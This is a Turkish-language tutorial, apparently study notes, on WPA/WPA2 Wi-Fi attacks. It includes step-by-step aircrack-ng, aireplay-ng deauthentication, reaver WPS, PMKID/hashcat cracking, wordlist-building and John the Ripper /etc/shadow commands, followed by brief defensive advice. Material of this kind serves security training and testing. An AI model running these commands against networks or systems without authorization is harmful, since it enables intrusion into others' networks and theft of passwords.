# WPA/WPA2 İleri Seviye Saldırılar ve Güvenlik Testleri

## 🔐 WPA (Wi-Fi Protected Access) Nasıl Çalışır?

WPA, kablosuz ağları korumak için geliştirilmiş bir güvenlik protokolüdür. WEP'in zayıflıklarını gidermek ve daha güçlü şifreleme sağlamak için tasarlanmıştır.

### 1. WPA'nın Temel Çalışma Mantığı

- **Dinamik Şifreleme Anahtarları Kullanır**: Her pakette farklı bir anahtar kullanılır.
- **Kimlik Doğrulama Gerektirir**: Ağ bağlantısı öncesi kimlik doğrulama yapılır.
- **Gelişmiş Şifreleme Kullanır**: TKIP veya AES kullanılır.

### 2. WPA Türleri ve Karşılaştırma

| WPA Türü | Şifreleme | Güvenlik Seviyesi |
|---------|-----------|-------------------|
| WPA     | TKIP + RC4 | Orta              |
| WPA2    | AES-CCMP   | Yüksek            |
| WPA3    | SAE + AES-GCMP | Çok Yüksek     |

### 3. WPA (İlk Versiyon)

- **TKIP** ile her paket için farklı anahtar kullanılır.
- **MIC (Message Integrity Check)** ile veri bütünlüğü sağlanır.
- **RC4 algoritması** zayıflığı nedeniyle zamanla kırılabilir hale gelmiştir.

### 4. WPA2

- **AES-CCMP** şifreleme algoritması kullanır.
- **802.1X ve EAP** kimlik doğrulama mekanizması vardır.
- Brute-force saldırılarına karşı savunmasız olabilir.

### 5. WPA3

- **SAE (Simultaneous Authentication of Equals)** kullanır.
- **Forward secrecy** sağlar.
- Offline brute-force saldırılarına karşı dirençlidir.

## 📌 WPA Şifreleme ve Kimlik Doğrulama Mekanizması

### WPA Bağlantı Türleri

| Bağlantı Türü      | Kullanım Alanı             |
|--------------------|----------------------------|
| WPA-Personal (PSK) | Ev ağları, küçük işletmeler|
| WPA-Enterprise (EAP) | Kurumsal ağlar            |

### Bağlantı Süreci

1. Cihaz Wi-Fi şifresiyle ağa bağlanmaya çalışır.
2. Router kimlik doğrulama başlatır.
3. "4-way handshake" gerçekleştirilir.
4. Veri şifreli iletilir.

## 📌 WPA Güvenlik Açıkları

### WPA Handshake Yakalama Komutu

```bash
sudo airodump-ng -c [KANAL] --bssid [BSSID] -w dump wlan0mon
```

### Brute-force Saldırısı

```bash
sudo aircrack-ng -b [BSSID] -w [Wordlist] dump.cap
```

## 🔐 WPA/WPA2 Handshake Yakalama Rehberi

### 1. WPA/WPA2 Handshake Nedir?

Kablosuz bir ağa bağlanma sırasında 4-Way Handshake oluşur:

1. Client bağlanmak ister.
2. Router challenge gönderir.
3. Client cevap verir.
4. Router onaylar.

## 🔧 Gerekli Araçlar

- Kali Linux / Parrot OS
- Monitor mode destekleyen Wi-Fi adaptör
- Aircrack-ng
- Wireshark (opsiyonel)

## 📡 Monitor Modunu Açma

```bash
sudo iwconfig
sudo airmon-ng start wlan0
sudo airmon-ng check kill
```

## 📡 Hedef Ağı ve Kanalı Belirleme

```bash
sudo airodump-ng wlan0mon
sudo airodump-ng -c [KANAL] --bssid [BSSID] -w handshake wlan0mon
```

## 💣 Deauthentication Saldırısı

```bash
sudo aireplay-ng -0 10 -a [BSSID] -c [CLIENT_MAC] wlan0mon
```

## ✅ Handshake Kontrolü

```bash
ls -l handshake*
```

Wireshark ile `.cap` dosyasını açıp "EAPOL" filtrelenebilir.

## 🔓 Handshake Kırma

### Aircrack-ng

```bash
sudo aircrack-ng -w rockyou.txt -b [BSSID] handshake-01.cap
```

### Hashcat

```bash
hashcat -m 22000 handshake-01.cap rockyou.txt --force
```

## 🔐 WPA3 ve Güvenlik Önlemleri

- SAE protokolü ile brute-force engellenir.
- Güçlü, uzun şifreler kullanın.
- WPA3 cihazlar tercih edin.

## 🔑 WPS PIN Zafiyeti ile Şifre Kırma

### WPS Destekli Cihazları Listeleme

```bash
sudo wash -i wlan0mon
```

### Reaver ile Saldırı

```bash
sudo reaver -i wlan0mon -b [BSSID] -vv
```

## ⚡ PMKID Saldırısı

### PMKID Paket Yakalama

```bash
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
```

### PMKID Hash Kırma

```bash
hashcat -m 16800 pmkid.pcapng rockyou.txt --force
```

## 📚 Wordlist Kaynakları

### RockYou.txt

```bash
gunzip /usr/share/wordlists/rockyou.txt.gz
```

### SecLists

```bash
git clone https://github.com/danielmiessler/SecLists.git
```

### Crunch ile Wordlist Oluşturma

```bash
crunch 8 10 abcdefghijklmnopqrstuvwxyz0123456789 -o custom_wordlist.txt
```

### CUPP

```bash
git clone https://github.com/Mebus/cupp.git
cd cupp
python3 cupp.py -i
```

### Hashcat Kurallarıyla Wordlist Genişletme

```bash
hashcat --stdout wordlist.txt -r rules/best64.rule > expanded_wordlist.txt
```

## 🔐 John the Ripper

### Kurulum

```bash
sudo apt update && sudo apt install john -y
```

### Kullanım

**Shadow Hash Analizi**

```bash
unshadow /etc/passwd /etc/shadow > hashlist.txt
john hashlist.txt
```

**Wordlist ile Kırma**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Format Belirterek Kırma**

```bash
john --format=nt hash.txt
john --format=md5 hash.txt
```

---

## 🔚 Sonuç

- WPA2 halen yaygın kullanılan ama kırılabilir bir protokoldür.
- WPA3 daha güvenlidir.
- Handshake veya PMKID üzerinden brute-force saldırılar mümkündür.
- Güçlü parola, güncel cihaz ve yazılım, WPS'in kapalı olması temel güvenlik önlemleridir.
